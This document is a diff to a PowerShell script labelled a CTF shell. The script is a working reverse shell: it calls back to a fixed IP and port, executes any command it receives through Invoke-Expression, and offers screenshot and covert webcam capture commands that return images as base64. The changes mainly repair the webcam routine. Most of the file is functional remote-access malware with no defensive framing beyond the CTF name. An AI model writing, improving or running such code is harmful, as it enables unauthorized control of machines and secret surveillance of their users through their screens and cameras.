@@ -1,7 +1,8 @@
-# --- THE ULTIMATE ATOMIC CTF SHELL ---
+# --- THE ULTIMATE ATOMIC CTF SHELL: LOCK-IN EDITION ---
 $ip = '192.168.1.15'
 $port = 4444
 
+# Setup the Socket
 $c = New-Object System.Net.Sockets.TCPClient
 try {
     $c.Connect($ip, $port)
@@ -10,7 +11,7 @@ try {
     $w = New-Object System.IO.StreamWriter($s)
     $w.AutoFlush = $true
 
-    $w.WriteLine("--- SYSTEM COMPROMISED: $($env:COMPUTERNAME) ---")
+    $w.WriteLine("--- ATOMIC SHELL: FULL SYSTEM ACCESS ---")
 
     while($c.Connected) {
         $w.Write("PS " + (Get-Location).Path + "> ")
@@ -21,6 +22,7 @@ try {
         if ($cmd -eq "exit") { break }
         if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
 
+        # --- BRANCHING LOGIC ---
         if ($cmd -eq "screenshot") {
             try {
                 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
@@ -37,47 +39,57 @@ try {
         } 
         elseif ($cmd -eq "webcam") {
             try {
+                # 1. Load the WinRT Core and Extensions
                 [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
+                [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.Properties, ContentType=WindowsRuntime]
+                
                 $mc = New-Object Windows.Media.Capture.MediaCapture
                 
-                # 1. Initialize and FORCE wait for the result
-                $initTask = $mc.InitializeAsync()
-                while ($initTask.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
-                $initTask.GetResults() | Out-Null # This ensures the object is "Ready"
+                # 2. Forced Initialization Sync
+                $init = $mc.InitializeAsync()
+                while ($init.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
+                $init.GetResults() | Out-Null
                 
-                # 2. Hardware "Warm-up" (The secret sauce)
-                Start-Sleep -Milliseconds 500
+                # Give the hardware a second to breathe
+                Start-Sleep -Seconds 1
                 
-                # 3. Prepare the capture
+                # 3. Prepare the Photo Capture
                 $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
                 $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
-                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
-                
+                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                 $lowLag = $prep.GetResults()
                 
-                # 4. Snap the photo
+                # 4. Snap the frame
                 $snap = $lowLag.CaptureAsync()
-                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
-                
+                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                 $photo = $snap.GetResults()
-                $stream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
+                
+                # 5. THE FIX: Explicit Stream Conversion
+                # We use the static extension method to bridge WinRT to .NET
+                $asStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
                 $ms = New-Object System.IO.MemoryStream
-                $stream.CopyTo($ms)
+                $asStream.CopyTo($ms)
                 
                 $out = [Convert]::ToBase64String($ms.ToArray())
-                $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
+                
+                # 6. Cleanup
+                $ms.Dispose(); $asStream.Dispose(); $mc.Dispose()
                 $w.WriteLine($out)
-            } catch { $w.WriteLine("Webcam Error: $($_.Exception.Message)") }
+            } catch {
+                $w.WriteLine("Webcam Error: $($_.Exception.Message)")
+            }
         } 
         else {
+            # Standard Shell Commands
             try {
                 $out = Invoke-Expression $cmd 2>&1 | Out-String
-                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Done." }
+                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Command Executed." }
                 $w.WriteLine($out)
             } catch { $w.WriteLine("Shell Error: $($_.Exception.Message)") }
         }
     }
 } catch {
+    # Connection failed
 } finally {
     if ($c) { $c.Close() }
 }
